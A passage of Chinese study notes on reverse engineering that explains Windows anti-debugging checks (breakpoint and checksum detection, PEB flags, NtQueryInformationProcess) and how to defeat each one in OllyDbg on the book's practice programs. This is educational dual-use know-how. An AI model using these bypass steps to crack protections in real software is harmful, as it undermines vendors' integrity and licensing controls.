API的起始地址检测代码的第一个字节，即可判断进程是否处于调试之中。</p><ul><li>破解之法</li></ul><p>针对上面这种反调试技术的行之有效的方法是，向系统API设置断点时尽量避开第一个字节，将之设置在代码的中间部分（图52-30中将断点设置在7C8107F2之下）。此外，设置硬件断点也能避开上面这种反调试技术。</p><h2 id="52-5-2-比较校验和"><a href="#52-5-2-比较校验和" class="headerlink" title="52.5.2 比较校验和"></a>52.5.2 比较校验和</h2><p>检测代码中设置的软件断点的另一个方法是，比较特定代码区域的校验和（Checksum）值。比如，假定程序中401000~401070地址区域的校验和值为0x12345678，在该代码区域中调试时，必然会设置一些断点（0xCC），如此一来，新的校验和值就与原值不一样了。像这样，比较校验和值即可判断进程是否处于调试状态（参考图52-31）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325155639928.png#alt=image-20220325155639928"></p><p><strong>练习：DynAD_Checksum.exe</strong></p><p>计算校验和来检测软件断点是常用的反调试技术之一，下面做个简单的调试练习，帮助各位理解该反调试技术的工作原理。在OllyDbg调试器中打开示例程序（DynAD_Checksum.exe）并转到401000地址处，如图52-32所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC52%E7%AB%A0%20%E5%8A%A8%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220325160022513.png#alt=image-20220325160022513"></p><p>如图52-32所示，程序的核心代码是求校验和值的循环（位于40102A地址处），及其下方的CMP&#x2F;JE条件分支指令（位于401035地址处）。先分析一下求校验和值的循环。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0040102A     3E:0FB61E       MOVZX EBX,BYTE PTR DS:[ESI]<br>0040102E     03C3            ADD EAX,EBX                            ;  EAX: new checksum value<br>00401030     D1C0            ROL EAX,1<br>00401032     46              INC ESI<br>00401033     E2 F5           LOOPD SHORT DynAD_Ch.0040102A<br></code></pre></td></tr></table></figure><p>40102A地址处ESI的初始值为401000 （参考40101F地址处的MOV指令），而ECX被用作LoopCount （循环计数），其值为70 （参考401024地址处的SUB指令）。代码中的循环用来计算401000-40106F区域的校验和值，先读取1个字节值，再执行ADD与ROL指令计算，然后将值保存到EAX寄存器（循环次数就是循环计数）。</p><blockquote><p>求代码缓冲区之校验和的方法多种多样，也有众多可应用的算法，只要验证相关内存区域当前的校验和值与原值是否一样即可。实际运用中通常会使用CRC32（Cyclic Redundancy Check,循环冗余校验）算法，它检错能力强，运算速度快。</p></blockquote><p>像这样求得校验和值后，接下来要将其与原值比较，并执行条件分支语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00401035     3B05 C0BD4000  CMP EAX,DWORD PTR DS:[40BDC0]           ;  Original checksum value<br>0040103B     74 07          JE SHORT DynAD_Ch.00401044<br></code></pre></td></tr></table></figure><p>在上面循环中求得的当前校验和值被保存到EAX寄存器，程序开发时计算的校验和值保存在[40BDC0]中。比较它们，若不同，则表明40100~40106F代码区域中设有断点，或者代码已被修改。</p><ul><li>破解之法</li></ul><p>从理论上讲，只要不在计算CRC的代码区域中设置断点或修改其中代码，基于校验和的反调试技术就会失效。但这本身也可能成为反调试技术觊觎的地方（因为调试变得更加困难）。因此，最好的破解方法是修改CRC比较语句。比如在前面的示例中，只要将40103B地址处的指令修改为<code>JMP 40105D</code>即可。当然也可以在调试器中强制修改要跳转（JMP）的地址。与其他反调试技术类似，基于校验和比较的反调试代码会巧妙隐藏于程序各处，可能存在数十个乃至数百个比较校验和的代码，这大大增加了破解难度，调试自然也变得困难多了。</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第51章 静态反调试技术</title>
    <link href="/1999/05/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"/>
    <url>/1999/05/01/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<p>本章我们将学习静态组别中的反调试技术，了解各技术的工作原理，并学习相应的破解之法。</p><h1 id="51-1-静态反调试的目的"><a href="#51-1-静态反调试的目的" class="headerlink" title="51.1 静态反调试的目的"></a>51.1 静态反调试的目的</h1><p>被调试进程用静态反调试技术来侦测自身是否处于被调试状态，若侦测到处于被调试状态，则执行非常规代码（主要是终止代码）来阻止。具体的实现方法包括调试器检测方法、调试环境检测方法、强制隔离调试器的方法等等。反调试破解方法主要用来从探测代码获取信息，然后修改信息本身使反调试技术失效。</p><blockquote><p>许多静态反调试技术对OS有较强依赖性。这意味着静态反调试技术在Windows XP系统下可以正常使用，而在Windows Vista&#x2F;7操作系统中可能失效。本章所有练习示例在Windows XP中顺利通过测试。</p></blockquote><h1 id="51-2-PEB"><a href="#51-2-PEB" class="headerlink" title="51.2 PEB"></a>51.2 PEB</h1><p>利用PEB结构体信息可以判断当前进程是否处于被调试状态。这些信息值得信赖、使用方便,所以广泛应用于反调试技术。</p><p>PEB结构体的成员中与反调试技术密切相关的成员如代码51-2所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">+<span class="hljs-number">0x002</span> BeingDebugged    : UChar<br>+<span class="hljs-number">0x008</span> ImageBaseAddress : Ptr32 Void<br>+<span class="hljs-number">0x00c</span> Ldr              : Ptr32 _PEB_LDR_DATA<br>+<span class="hljs-number">0x018</span> ProcessHeap      : Ptr32 Void<br>+<span class="hljs-number">0x068</span> NtGlobalFlag     : Uint4B<br></code></pre></td></tr></table></figure><p>BeingDebugged成员是一个标志（Flag),用来表示进程是否处于被调试状态。Ldr、ProcessHeap、NtGlobalFlag成员与被调试进程的堆内存特性相关。</p><p>接下来分别讲解以上4个PEB成员。</p><blockquote><p>借助FS段寄存器所指的TEB结构体可轻松获取进程的PEB结构体地址。TEB.ProcessEnvironmentBlock成员（偏移为+0x30)指向PEB结构体地址，有以下2种方法可以获取PEB结构体的地址。</p></blockquote><blockquote><p>(1)直接获取PEB的地址</p></blockquote><blockquote><p>MOV EAX, DWORD PTR FS: [0x30]; FS[0x30] &#x3D; address of PEB</p></blockquote><blockquote><p>(2) 先获取TEB地址，再通过ProcessEnvironmentBlock成员（偏移为+0x30 )获取PEB地址</p></blockquote><blockquote><p>MOV EAX, DWORD PTR FS: [0x18] ; FS[0x18] &#x3D; address of TEB</p></blockquote><p>MOV EAX, DWORD PTR DS: [EAX+0x30]; DS[EAX+0x30] &#x3D; address of PEB</p><blockquote><p>第二种方法其实是第一种方法的展开形式，二者都通过TEB.ProcessEnviromnentBlock成员的值来获取PEB结构体的地址。更详细的说明请参考第46、47章。</p></blockquote><h2 id="51-2-1-BeingDebugged-0x2"><a href="#51-2-1-BeingDebugged-0x2" class="headerlink" title="51.2.1 BeingDebugged(+0x2)"></a>51.2.1 BeingDebugged(+0x2)</h2><p>进程处于调试状态时，PEB.BeingDebugged成员(+0x2)的值被设置为1 (TRUE);进程在非调试状态下运行时，其值被设置为0 ( FALSE )。</p><p><strong>lsDebuggerPresent()</strong></p><p>IsDebuggerPresent() AIM获取PEB.BeingDebugged的值来判断进程是否处于被调试状态。直 接查看其代码可以更清楚地理解它（我的系统环境中，PEB的起始地址为7FFD9000 ),如图51-1所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322201807522.png#alt=image-20220322201807522"></p><p>IsDebuggerPresent() API代码非常简单，先获取TEB结构体的地址（FS:[18]）,再通过TEB.ProcessEnvironmentBlock成员（+0x30）获取PEB的地址，然后访问PEB.BeingDebugged成员</p><p>(+0x2)。如图51-1所示，PEB的地址为7FFD7000, PEB.BeingDebugged成员的地址为7FFDF002。因当前正用OllyDbg调试进程，故BeingDebugged的值为1 (TRUE)。</p><p>-<br>破解之法</p><p>只要借助OllyDbg调试器的编辑功能，将PEB.BeingDebugged的值修改为0 ( FALSE )即可。</p><h2 id="51-2-2-Ldr-0xC"><a href="#51-2-2-Ldr-0xC" class="headerlink" title="51.2.2 Ldr(+0xC)"></a>51.2.2 Ldr(+0xC)</h2><blockquote><p>该方法仅适用于Windows XP系统，而在Windows Vista以后的系统中则无法使用。另外，利用附加功能将运行中的进程附加到调试器时，堆内存中并不出现上述标识。</p></blockquote><p>调试进程时，其堆内存区域中就会岀现一些特殊标识，表示它正处于被调试状态。其中最醒目的是，未使用的堆内存区域全部填充着0xFEEEFEEE，这证明正在调试进程。利用这一特征即可判断进程是否处于被调试状态。</p><p>PEB.Ldr成员是一个指结构体的指针，结构体恰好是在堆内存区域中创建的，所以扫描该区域即可轻松查找是否存在0xFEEEFEEE区域（我的系统环境中，PEB的起始地址为7FFD9000 )，如图51-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322191426277.png#alt=image-20220322191426277"></p><p>进入PEB.Ldr地址（241EA0)，向下拖动滑动条，查找0xFEEEFEEE区域，如图51-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322191511324.png#alt=image-20220322191511324"></p><p>在堆内存中可以看到填充着0xFEEEFEEE的区域。</p><p>-<br>破解之法</p><p>只要将填充着0xFEEEFEEE值的区域全部覆写为NULL即可。</p><h2 id="51-2-3-Process-Heap-0x18"><a href="#51-2-3-Process-Heap-0x18" class="headerlink" title="51.2.3 Process Heap(+0x18)"></a>51.2.3 Process Heap(+0x18)</h2><blockquote><p>该方法仅在WindowsXP系统中有效，Windows7系统不存在以上特征。此外，将运行中的进程附加到调试器时，也不会出现上述特征</p></blockquote><p>PEB.ProcessHeap成员(+0x18)是指向HEAP结构体的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">lkd&gt; dt ntdll!_HEAP<br>   +<span class="hljs-number">0x000</span> Entry            : _HEAP_ENTRY<br>   +<span class="hljs-number">0x008</span> SegmentSignature : Uint4B<br>   +<span class="hljs-number">0x00c</span> SegmentFlags     : Uint4B<br>   +<span class="hljs-number">0x010</span> SegmentListEntry : _LIST_ENTRY<br>   +<span class="hljs-number">0x018</span> Heap             : Ptr32 _HEAP<br>   +<span class="hljs-number">0x01c</span> BaseAddress      : Ptr32 Void<br>   +<span class="hljs-number">0x020</span> NumberOfPages    : Uint4B<br></code></pre></td></tr></table></figure><p>以上列岀了HEAP结构体的部分成员，进程处于被调试状态时，Flags(+0xC)与Force Flags成员(+0x10)被设置为特定值。</p><p><strong>GetProcessHeap()</strong></p><p>PEB.ProcessHeap成员(+0x18)既可以从PEB结构体直接获取，也可以通过GetProcessHeap()API获取。下面看看GetProcessHeap() API的代码（我的系统环境中，PEB的起始地址为7FFDF000）。</p><p>GetProcessHeap() API 的代码基本类似于 IsDebuggerPresent()，按照 TEB → PEB →</p><p>PEB.ProcessHeap顺序依次访问。</p><p>图51-4中进程HEAP结构体的地址为PEB.ProcessHeap&#x3D;140000。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322195628841.png#alt=image-20220322195628841"></p><p><strong>Flags(+0xC) &amp; Force Flags(+0x10)</strong></p><p>进程正常运行（非调试运行）时，Heap.Flags成员(+0xC)的值为0x2，Heap.ForceFlags成员 (+0x10)的值为0x0。进程处于被调试状态时，这些值也会随之改变（参考图51-5.)。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322195849064.png#alt=image-20220322195849064"></p><p>所以，比较这些值就可以判断进程是否处于被调试状态。</p><p>-<br>破解之法</p><p>只要将HEAP.Flags与HEAP.ForceFlags的值重新设置为2与0即可（HEAP.Flags&#x3D;2，HEAP.ForceFlags&#x3D;0）。</p><h2 id="51-2-4-NtGlobalFlag-0x68"><a href="#51-2-4-NtGlobalFlag-0x68" class="headerlink" title="51.2.4 NtGlobalFlag(+0x68)"></a>51.2.4 NtGlobalFlag(+0x68)</h2><p>调试进程时，PEB.NtGlobalFlag成员(+0x68)的值会被设置为0x70。所以，检测该成员的值即可判断进程是否处于被调试状态（我的系统环境中，PEB的起始地址为7FFD7000)，如图51-6所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322200422469.png#alt=image-20220322200422469"></p><p>NtGlobalFlag 0x70是下列Flags值进行bit OR (位或）运算的结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">FLG_HEAP_ENABLE_TAIL_CHECK(<span class="hljs-number">0x10</span>)<br>FLG_HEAP_ENABLE_FREE_CHECK(<span class="hljs-number">0x20</span>)<br>FLG_HEAP_VALIDATE_PARAMETERS(<span class="hljs-number">0x40</span>)<br></code></pre></td></tr></table></figure><p>被调试进程的堆内存中存在（不同于非调试运行进程的）特别标识，因此在PEB.NtGlobalFlag成员中添加了上述标志。</p><p>-<br>破解之法</p><p>重设PEB.NtGlobalFlag值为0即可（PEB.NtGlobalFlag&#x3D;0 )。</p><blockquote><p>将运行中的进程附加到调试器时，NtGlobalFlag的值不变。</p></blockquote><h2 id="51-2-5-练习：StaAD-PEB-exe"><a href="#51-2-5-练习：StaAD-PEB-exe" class="headerlink" title="51.2.5 练习：StaAD_PEB.exe"></a>51.2.5 练习：StaAD_PEB.exe</h2><p>下面调试示例文件StaAD_PEB.exe来学习基于PEB的反调试技术，以及相应的破解方法。在OllyDbg中按F9键运行StaAD_PEB.exe文件，如图51-7所示，所有项都显示当前进程处于调试之中，基于PEB的反调试功能工作正常。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322201257560.png#alt=image-20220322201257560"></p><h2 id="51-2-6-破解之法"><a href="#51-2-6-破解之法" class="headerlink" title="51.2.6 破解之法"></a>51.2.6 破解之法</h2><p>下面介绍在OllyDbg中破解PEB反调试技术的方法。按Ctrl+F2重启OllyDbg后，直接到main()函数的起始地址处（401000)。</p><p><strong>PEB.BeingDebugged</strong></p><p>跟踪调试代码，在401036地址处遇到调用IsDebuggerPresent()API的代码，如图51-8所示。使用StepInto(F7)命令跟踪进入API,出现图51-1所示的代码。只要将PEB.BeingDebugged值修改为0，</p><p>即可破解基于BeingDebugged检测的反调试技术。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322202025864.png#alt=image-20220322202025864"></p><p><strong>PEB.Ldr</strong></p><p>继续调试会遇到PEB.Ldr反调试代码，如图51-9所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322202222514.png#alt=image-20220322202222514"></p><p>接下来简单讲解代码。40107B地址处的CALL EAX指令用来调用ntdll.NtCurrentTeb() API，40107D地址处的MOV指令用来将PEB地址保存到EBX寄存器。地址401090<del>40109E间的指令用来将局部变量（[EBP-20]</del>[EBP-2C])初始化为EEFEEEFE值。而4010A1地址处的MOV指令用来将PEB.Ldr地址存储到ESI寄存器。继续跟踪到4010C7地址处，如图51-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322202812357.png#alt=image-20220322202812357"></p><p>地址4010B0~4010DA间的代码由循环构成。下面看看4010C7地址处的<code>CMP EDI,DWORD PTR DS:[ECX]</code>指令。EDI寄存器中存储着从PEB.Ldr地址读取的4个字节值，[ECX]中的值为EEFEEEFE (ECX寄存器中存储着初始化为EEFEEEFE的数组的起始地址）。也就是说，图51-10中的代码用来查找PEB.Ldr中初始化为EEFEEEFE的区域。</p><p>该调试探测技术的破解之法是：先转到（4010C5地址的）EDX寄存器所指的PEB.Ldr，然后查找EEFEEEFE区域并用NULL值覆盖。</p><p>选中PEB.Ldr下的整个EEFEEEFE区域，在OllyDbg菜单栏中依次选择“Binary - Fill with 00’s”菜单填充（如图51-11所示）。按F2键在4010FB地址处设置断点，然后按F9运行即可安全跳出循环。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322203029892.png#alt=image-20220322203029892"></p><p><strong>PEB.ProcessHeap</strong></p><p>继续调试，遇到图51-12所示的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322203506171.png#alt=image-20220322203506171"></p><p>以上代码通过检测 PEB.ProcessHeap.Flags 与 PEB.ProcessHeap.ForceFlags 的值来反调试。401112地址处的MOV指令用来将PEB.ProcessHeap结构体的首地址转移到EDI寄存器（图51 -12内存窗口显示的地址为150000 )。地址401115处的[EDI+C]是PEB.ProcessHeap.Flags值，将该值修改为2。地址40113F处的[EDI+10]是PEB.ProcessHeap.ForceFlags值，将该值修改为0。这样修改就能破解基于PEB.ProcessHeap的反调试代码。</p><p><strong>PEB.NtGlobalFlag</strong></p><p>继续调试，遇到基于PEB.NtGlobalFlag的反调试代码，如图51-13所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/%E7%AC%AC51%E7%AB%A0%20%E9%9D%99%E6%80%81%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF.assets/image-20220322203638221.png#alt=image-20220322203638221"></p><p>地址401168处的[EBX+68]即为PEB.NtGlobalFlag,将其值修改为0即可破解反调试代码</p><blockquote><p>请注意：在Windows XP中使用OllyDbg开始调试程序时，EBX寄存器中存储的是PEB的地址。</p></blockquote><h1 id="51-3-NtQuerylnformationProcess"><a href="#51-3-NtQuerylnformationProcess" class="headerlink" title="51.3 NtQuerylnformationProcess()"></a>51.3 NtQuerylnformationProcess()</h1><p>下面介绍另外一种利用NtQueryInformationProcess() API探测调试器的技术。通过NtQueryInformationProcess() API可以获取各种与进程调试相关的信息，该函数定义如代码51-4所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__kernel_entry NTSTATUS <span class="hljs-title function_">NtQueryInformationProcess</span><span class="hljs-params">(</span><br><span class="hljs-params">  [in]            HANDLE           ProcessHandle,</span><br><span class="hljs-params">  [in]            PROCESSINFOCLASS ProcessInformationClass,</span><br><span class="hljs-params">  [out]           PVOID            ProcessInformation,</span><br><span class="hljs-params">  [in]            ULONG            ProcessInformationLength,</span><br><span class="hljs-params">  [out, optional] PULONG           ReturnLength</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>为 NtQueryInformationProcess()函数的第二个参数 PROCESSINFOCLASS ProcesslnformationClass指定特定值并调用该函数，相关信息就会设置到其第三个参数PVOID Processlnformation。PROCESSINFOCLASS是枚举类型，拥有的值如代码51-5所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">PROCESSINFOCLASS</span></span><br><span class="hljs-class">&#123;</span><br>    ProcessBasicInformation             = <span class="hljs-number">0x00</span>,<br>    ProcessQuotaLimits              = <span class="hljs-number">0x01</span>,<br>    ProcessIoCounters               = <span class="hljs-number">0x02</span>,<br>    ProcessVmCounters               = <span class="hljs-number">0x03</span>,<br>    ProcessTimes                = <span class="hljs-number">0x04</span>,<br>    ProcessBasePriority             = <span class="hljs-number">0x05</span>,<br>    ProcessRaisePriority            = <span class="hljs-number">0x06</span>,<br>    ProcessDebugPort                = <span class="hljs-number">0x07</span>,<br>    ProcessExceptionPort            = <span class="hljs-number">0x08</span>,<br>    ProcessAccessToken              = <span class="hljs-number">0x09</span>,<br>    ProcessLdtInformation               = <span class="hljs-number">0x0A</span>,<br>    ProcessLdtSize                  = <span class="hljs-number">0x0B</span>,<br>    ProcessDefaultHardErrorMode         = <span class="hljs-number">0x0C</span>,<br>    ProcessIoPortHandlers               = <span class="hljs-number">0x0D</span>,<br>    ProcessPooledUsageAndLimits         = <span class="hljs-number">0x0E</span>,<br>    ProcessWorkingSetWatch              = <span class="hljs-number">0x0F</span>,<br>    ProcessUserModeIOPL             = <span class="hljs-number">0x10</span>,<br>    ProcessEnableAlignmentFaultFixup        = <span class="hljs-number">0x11</span>,<br>    ProcessPriorityClass            = <span class="hljs-number">0x12</span>,<br>    ProcessWx86Information              = <span class="hljs-number">0x13</span>,<br>    ProcessHandleCount              = <span class="hljs-number">0x14</span>,<br>    ProcessAffinityMask             = <span class="hljs-number">0x15</span>,<br>    ProcessPriorityBoost            = <span class="hljs-number">0x16</span>,<br>    ProcessDeviceMap                = <span class="hljs-number">0x17</span>,<br>    ProcessSessionInformation           = <span class="hljs-number">0x18</span>,<br>    ProcessForegroundInformation        = <span class="hljs-number">0x19</span>,<br>    ProcessWow64Information             = <span class="hljs-number">0x1A</span>,<br>    ProcessImageFileName            = <span class="hljs-number">0x1B</span>,<br>    ProcessLUIDDeviceMapsEnabled        = <span class="hljs-number">0x1C</span>,<br>    ProcessBreakOnTermination           = <span class="hljs-number">0x1D</span>,<br>    ProcessDebugObjectHandle            = <span class="hljs-number">0x1E</span>,<br>    ProcessDebugFlags               = <span class="hljs-number">0x1F</span>,<br>    ProcessHandleTracing            = <span class="hljs-number">0x20</span>,<br>    ProcessIoPriority               = <span class="hljs-number">0x21</span>,<br>    ProcessExecuteFlags             = <span class="hljs-number">0x22</span>,<br>    ProcessResourceManagement           = <span class="hljs-number">0x23</span>,<br>    ProcessCookie                   = <span class="hljs-number">0x24</span>,<br>    ProcessImageInformation             = <span class="hljs-number">0x25</span>,<br>    ProcessCycleTime                = <span class="hljs-number">0x26</span>,<br>    ProcessPagePriority             = <span class="hljs-number">0x27</span>,<br>    ProcessInstrumentationCallback          = <span class="hljs-number">0x28</span>,<br>    ProcessThreadStackAllocation        = <span class="hljs-number">0x29</span>,<br>    ProcessWorkingSetWatchEx            = <span class="hljs-number">0x2A</span>,<br>    ProcessImageFileNameWin32           = <span class="hljs-number">0x2B</span>,<br>    ProcessImageFileMapping             = <span class="hljs-number">0x2C</span>,<br>    ProcessAffinityUpdateMode           = <span class="hljs-number">0x2D</span>,<br>    ProcessMemoryAllocationMode         = <span class="hljs-number">0x2E</span>,<br>    ProcessGroupInformation             = <span class="hljs-number">0x2F</span>,<br>    ProcessTokenVirtualizationEnabled       = <span class="hljs-number">0x30</span>,<br>    ProcessConsoleHostProcess           = <span class="hljs-number">0x31</span>,<br>    ProcessWindowInformation            = <span class="hljs-number">0x32</span>,<br>    ProcessHandleInformation            = <span class="hljs-number">0x33</span>,<br>    ProcessMitigationPolicy             = <span class="hljs-number">0x34</span>,<br>    ProcessDynamicFunctionTableInformation      = <span class="hljs-number">0x35</span>,<br>    ProcessHandleCheckingMode           = <span class="hljs-number">0x36</span>,<br>    ProcessKeepAliveCount               = <span class="hljs-number">0x37</span>,<br>    ProcessRevokeFileHandles            = <span class="hljs-number">0x38</span>,<br>    ProcessWorkingSetControl            = <span class="hljs-number">0x39</span>,<br>    ProcessHandleTable              = <span class="hljs-number">0x3A</span>,<br>    ProcessCheckStackExtentsMode        = <span class="hljs-number">0x3B</span>,<br>    ProcessCommandLineInformation           = <span class="hljs-number">0x3C</span>,<br>    ProcessProtectionInformation        = <span class="hljs-number">0x3D</span>,<br>    ProcessMemoryExhaustion             = <span class="hljs-number">0x3E</span>,<br>    ProcessFaultInformation             = <span class="hljs-number">0x3F</span>,<br>    ProcessTelemetryIdInformation           = <span class="hljs-number">0x40</span>,<br>    ProcessCommitReleaseInformation         = <span class="hljs-number">0x41</span>,<br>    ProcessDefaultCpuSetsInformation        = <span class="hljs-number">0x42</span>,<br>    ProcessAllowedCpuSetsInformation        = <span class="hljs-number">0x43</span>,<br>    ProcessSubsystemProcess             = <span class="hljs-number">0x44</span>,<br>    ProcessJobMemoryInformation         = <span class="hljs-number">0x45</span>,<br>    ProcessInPrivate                = <span class="hljs-number">0x46</span>,<br>    ProcessRaiseUMExceptionOnInvalidHandleClose = <span class="hljs-number">0x47</span>,<br>    ProcessIumChallengeResponse         = <span class="hljs-number">0x48</span>,<br>    ProcessChildProcessInformation          = <span class="hljs-number">0x49</span>,<br>    ProcessHighGraphicsPriorityInformation      = <span class="hljs-number">0x4A</span>,<br>    ProcessSubsystemInformation         = <span class="hljs-number">0x4B</span>,<br>    